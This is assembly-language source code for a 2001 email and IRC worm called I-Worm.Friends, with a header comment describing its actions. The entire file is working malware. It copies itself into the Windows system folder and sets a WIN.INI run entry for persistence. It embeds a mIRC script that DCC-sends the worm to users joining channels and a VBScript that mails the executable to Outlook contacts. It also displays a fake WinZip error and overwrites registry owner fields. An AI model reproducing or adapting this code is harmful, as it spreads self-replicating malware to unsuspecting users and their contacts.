; comment #
; Name : I-Worm.Friends
; Author : PetiK
; Date : May 13th - May 15th 2001
; Action : This worm use a VBS script and Micosoft Outlook to spread. It copies itself to
;    \%SYSTEM%\Iesetup.exe. WIN.INI is modified with run=\%SYSTEM%\Iesetup.exe.
;    It creates a script file for mIRC in C:\mirc ans C:\mirc32.
;    It shows the first time a fake Winzip message box.
;    The worm creates C:\Friends and creates the file maya.vbs to spread.
;    It changes the values : HKLM\Software\Microsoft\Windows\CurrentVersion
;           RegisteredOwner : Maya, Laurent, Etienne
;           RegisteredOrganization : PetiK Corporation
;    On 5th of every month, it shows a message box.
; 
; #



.386
jumps
locals
.model flat,stdcall

;KERNEL32.dll
extrn WritePrivateProfileStringA:PROC
extrn lstrcat:PROC
extrn GetModuleFileNameA:PROC
extrn CopyFileA:PROC
extrn CreateDirectoryA:PROC
extrn CreateFileA:PROC
extrn ExitProcess:PROC
extrn CloseHandle:PROC
extrn GetModuleHandleA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetSystemTime:PROC
extrn GetWindowsDirectoryA:PROC
extrn WinExec:PROC
extrn WriteFile:PROC

;USER32.dll
extrn   MessageBoxA:PROC

;ADVAPI32.dll
extrn   RegOpenKeyExA:PROC
extrn   RegSetValueExA:PROC
extrn   RegCloseKey:PROC


.data
szOrig      db 50 dup (0)
szPTK       db 50 dup (0)
szWin       db 50 dup (0)
FileHandle  dd ?
RegHandle   dd ?
octets      dd ?
winini          db "\\WIN.INI",00h
run             db "run",00h
windows         db "windows",00h
Copie       db "\Iesetup.exe",00h
inifile     db "\petik",00h
script1     db "C:\mirc\script.ini",00h
script2     db "C:\mirc32\script.ini",00h
VBS     db "C:\Friends\maya.vbs",00h
DIR     db "C:\Friends",00h
OWN_D       db "RegisteredOwner",00h
OWN_S       db "Maya, Laurent, Etienne",00h
ORG_D       db "RegisteredOrganization",00h
ORG_S       db "PetiK Corporation",00h
SOUS_CLE    db "Software\Microsoft\Windows\CurrentVersion",00h
TITRE       db "WinZip Self-Extractor",00h
TEXTE       db "WinZip Self-Extractor header corrupt. Possible cause: bad disk or file transfer error",00h
TITRE2      db "I-Worm.Friends",00h
TEXTE2      db "Coded by PetiK (c)2001",0dh,0ah
        db "",0dh,0ah
        db "To my friends Maya and Laurent",00h
email       db "wscript C:\Friends\maya.vbs",00h


FILE_ATTRIBUTE_READONLY equ 00000001h
CREATE_NEW      equ 00000001h
CREATE_ALWAYS       equ 00000002h
FILE_SHARE_READ     equ 00000001h
GENERIC_WRITE       equ 40000000h
HKEY_LOCAL_MACHINE  equ 80000002h
KEY_SET_VALUE       equ 00000002h
REG_SZ          equ 00000001h

SYSTIME struct
wYear       WORD ?
wMonth      WORD ?
wDayOfWeek  WORD ?
wDay        WORD ?
wHour       WORD ?
wMinute     WORD ?
wsecond     WORD ?
wMilliseconds   WORD ?
SYSTIME ends
SystemTime SYSTIME <>


petikd:     db "[script]",0dh,0ah
        db "n0=on 1:JOIN:#:{",0dh,0ah
        db "n1= /if ( $nick == $me ) { halt }",0dh,0ah
        db "n2= /.dcc send $nick "
szCopie     db 50 dup (0)
        db "",0dh,0ah
        db "n3=}",00h
PETIKTAILLE equ $-petikd

mayad:
db 'Set fso=CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'fso.Copyfile fso.GetSpecialFolder(1)&"\Iesetup.exe", fso.GetSpecialFolder(1)&"\NetFriends.exe"',0dh,0ah
db 'Set K = CreateObject("Outlook.Application")',0dh,0ah
db 'Set L = K.GetNameSpace("MAPI")',0dh,0ah
db 'For Each M In L.AddressLists',0dh,0ah
db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For O = 1 To M.AddressEntries.Count',0dh,0ah
db 'Set P = M.AddressEntries(O)',0dh,0ah
db 'Next',0dh,0ah
db 'Set N = K.CreateItem(0)',0dh,0ah
db 'N.Subject = "Would you like a Net Friend ?"',0dh,0ah
db 'N.Body = "Look at this zip file to find a Net Friend"',0dh,0ah
db 'Set Q = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(1),"NetFriends.exe")',0dh,0ah
db 'If N.To <> "" Then',0dh,0ah
db 'N.Send',0dh,0ah
db 'End If',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
MAYATAILLE equ $-mayad

.code
DEBUT:
PREPAR: push 50
    push offset szCopie
    call GetSystemDirectoryA
    push offset Copie
    push offset szCopie
    call lstrcat
FILE:   push 50                 ; Create PetiK in \%WINDIR%, a mIRC script
    push offset szPTK
    call GetWindowsDirectoryA
    push offset inifile
    push offset szPTK
    call lstrcat
    push 00h
    push FILE_ATTRIBUTE_READONLY
    push CREATE_NEW
    push 00h
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push offset szPTK           ; success ? continue 
    call CreateFileA
    cmp  eax,-1
    je   BDR                ; or else, jump to label BDR
    mov  [FileHandle],eax
    push 00h
    push offset octets
    push PETIKTAILLE
    push offset petikd
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle            ; the file is create

MIRC:   push 00h
    push offset script1
    push offset szPTK
    call CopyFileA              ; copy the file to C:\mirc
    push 00h
    push offset script2
    push offset szPTK
    call CopyFileA              ; and C:\mirc32

EMAIL:  push 00h
    push offset DIR
        call CreateDirectoryA           ; Create the directory C:\Friends
    push 00h
    push FILE_ATTRIBUTE_READONLY
    push CREATE_ALWAYS
    push 00h
    push FILE_SHARE_READ
        push GENERIC_WRITE
    push offset VBS
    call CreateFileA            ; and put the VBS file maya.vbs
    mov  [FileHandle],eax
    push 00h
    push offset octets
    push MAYATAILLE
    push offset mayad
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle

ENVOIE: push 01h
    push offset email
    call WinExec                ; run this file
        
COPIE:  push 00h
    call GetModuleHandleA
    push 50
    push offset szOrig
    push eax
    call GetModuleFileNameA
    push 00h
    push offset szCopie
    push offset szOrig
    call CopyFileA              ; Copy our file ti \%SYSTEM%\Iesetup.exe
WIN_INI:push 50h
        push offset szWin
        call GetWindowsDirectoryA
        push offset winini
        push offset szWin
        call lstrcat
        push offset szWin           ; Write to WIN.INI file in run section
        push offset szCopie         ; [windows]
        push offset run             ; run=\%SYSTEM%\Iesetup.exe
        push offset windows
        call WritePrivateProfileStringA
    
MESS:   push 10h                ; Show the fake error message
    push offset TITRE
    push offset TEXTE
    push 00h
    call MessageBoxA

BDR:    push offset RegHandle
    push KEY_SET_VALUE
    push 00h
    push offset SOUS_CLE
    push HKEY_LOCAL_MACHINE
    call RegOpenKeyExA

    push 02h
    push offset OWN_D
    push offset REG_SZ
    push 00h
    push offset OWN_S
    push [RegHandle]
    call RegSetValueExA         ; Change the name of Registered Owner

    push 02h
    push offset ORG_D
    push offset REG_SZ
    push 00h
    push offset ORG_S
    push [RegHandle]
    call RegSetValueExA         ; Change the name of Registered Organization

    push [RegHandle]
    call RegCloseKey

DATE:   push offset SystemTime
    call GetSystemTime
    cmp  [SystemTime.wDay],05h      ; 5th of the month ?
    jne  FIN
    push 40h
    push offset TITRE2
    push offset TEXTE2
    push 00h
    call MessageBoxA            ; Show a messagebox

FIN:    push 00h
    call ExitProcess

end DEBUT
